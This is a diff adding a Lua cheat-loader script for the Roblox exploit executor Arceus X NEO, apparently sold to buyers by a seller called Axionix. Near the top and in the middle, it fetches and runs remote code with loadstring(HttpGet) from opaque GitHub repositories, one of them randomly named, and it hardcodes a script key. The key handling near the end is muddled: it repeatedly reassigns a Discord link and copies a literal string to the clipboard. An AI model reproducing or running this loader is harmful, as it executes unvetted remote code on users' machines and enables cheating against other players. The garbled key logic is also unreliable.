@@ -1,0 +1,51 @@
+-- This Is Where The Script Is Only For The Executor Is Arceus X NEO For Those Who Bought Same Hwid From AfxcaxiRoblox Or Axionix
+setfpscap(360)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/0saNSNM"))()
+wait(2)
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Hi Buyer",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+print("Axionix")
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Thank You For Purchasing My Script",
+	Image = "rbxassetid://4483345998",
+	Time = 4
+})
+print("Axionix")
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Please Enjoy My Script",
+	Image = "rbxassetid://4483345998",
+	Time = 3
+})
+print("Axionix")
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "https://discord.gg/axionix",
+	Image = "rbxassetid://4483345998",
+	Time = 2
+})
+print("Axionix")
+script_key="LXiBzeXByRByxRGRsoiduiGXguagnWEZ";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/PremiumBuangHub.lua"))()
+print("Axionix")
+script_key="https://discord.gg/axionix";
+print("Axionix")
+Key1 = script_key
+script_key = "https://discord.gg/axionix"
+print("Axionix")
+ID1 = script_key
+script_key = "https://discord.gg/axionix"
+print("ID1")
+print("Key1")
+setclipboard("Key1")
+print("ID1")
+print("Axionix")
+script_key="https://discord.gg/axionix";
+
+   
